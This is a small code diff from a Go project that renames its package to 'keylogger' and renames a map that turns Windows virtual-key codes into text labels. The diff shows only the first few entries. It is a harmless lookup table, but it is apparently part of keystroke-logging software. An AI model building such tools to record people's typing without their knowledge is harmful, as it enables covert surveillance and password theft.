@@ -1,9 +1,9 @@
-package main
+package keylogger
 
 import "github.com/moutend/go-hook/pkg/types"
 
-// VKCodeMap Map each key to a string
-var VKCodeMap = map[types.VKCode]string{
+// VKCodeBaseNameMap Map each key to a string
+var VKCodeBaseNameMap = map[types.VKCode]string{
 	0x01: "--LBUTTON/",
 	0x02: "--RBUTTON/",
 	0x03: "--CANCEL/",
